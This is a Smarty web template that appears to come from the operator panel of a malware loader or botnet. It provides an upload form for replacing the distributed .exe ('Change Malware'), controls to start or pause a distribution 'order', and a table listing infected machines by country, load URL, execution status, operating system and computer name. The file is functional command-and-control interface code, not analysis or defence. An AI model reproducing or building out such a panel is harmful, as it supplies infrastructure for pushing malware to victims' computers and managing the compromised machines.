{include file="header.tpl" }
{include file="nav.tpl" title=foo}


    <div class="content-body">

        <div class="taskedit">
            <div class="row">


                <form class="col-md-8 " action="" method="post" enctype="multipart/form-data">
                    <div class="input-group">

                        <!-- <p>Currently we are Loading from you latest Upload: {$order.order.order.command}</p> -->
                        <div style="width: 80%">
                            <input type="file" class="upload" name="uploaded_file" data-height="100" accept=".exe" required>
                        </div>
                        <button style="float:right;" type="submit" class="btn btn-primary">Change Malware</button>
                    </div>


                </form>


                <form class="col-md-4" method="post">

                    {if $order.order.order.status == "1"}
                        <input name="changerunningtask" value="stop" hidden>

                        <button style="height: 100px; width: 100%" type="submit" class="btn btn-dark">
                            <h4 class="side">Your Order is Running<br>
                                {$order.order.order.command}</h4>
                            <div class="play-button-outer">
                                <div class="play-pause"></div>
                            </div>
                        </button>
                    {else}
                        <button style="height: 100px; width: 100%" type="submit" class="btn btn-dark">
                            <h4 class="side">Your Order is Paused<br>
                                {$order.order.order.command}</h4>
                            <div class="play-button-outer">
                                <div class="play-button"></div>
                            </div>
                        </button>

                        <input name="changerunningtask" value="start" hidden>
                    {/if}

                </form>
            </div>
        </div>


        <table class="table">
            <tr>
                <th>Country</th>
                <th>LoadUrl</th>
                <th>Execution Status</th>
                <th>Opering System</th>
                <th>Computername</th>
            </tr>
            {foreach from=$order.order item=bot}
                {if !isset($bot.address)}
                    <tr>
                        <td><!-- <img src="{$includeDir}assets/img/flags/{$bot.country|lower}.png"> -->{$bot.country}  </td>
                        <td>{$order.order.order.loadurl}</td>
                        <td>{$bot.status}</td>
                        <td>{$bot.operingsystem}</td>
                        <td>{$bot.computrername}</td>

                    </tr>
                {/if}
            {/foreach}
        </table>
    </div>
</div>






{include file="footer.tpl"}




<script>
    $('.upload').dropify({
        messages: {
            'default': 'Upload a new File to change the current one',
            'replace': 'Drag and drop or click to replace',
            'remove':  'Remove',
            'error':   'Ooops, something wrong happended.'
        }
    });
</script>

